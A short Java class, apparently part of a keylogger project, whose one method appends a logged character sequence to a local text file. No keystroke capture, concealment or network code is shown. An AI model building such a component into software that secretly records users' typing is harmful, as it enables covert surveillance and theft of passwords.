package features;

import java.io.FileWriter;
import java.io.IOException;

public class KeyLoggerFile {
    FileWriter myWriter;

    public void keyLoggerWriter(CharSequence log) throws IOException {
        try{
            myWriter = new FileWriter("filename.txt",true);
        } catch (IOException e) {
            e.printStackTrace();
        }
        myWriter.append(log);
        myWriter.close();
    }

//    public void keyLoggerWriterClose() throws IOException {
//        myWriter.close();
//    }
}
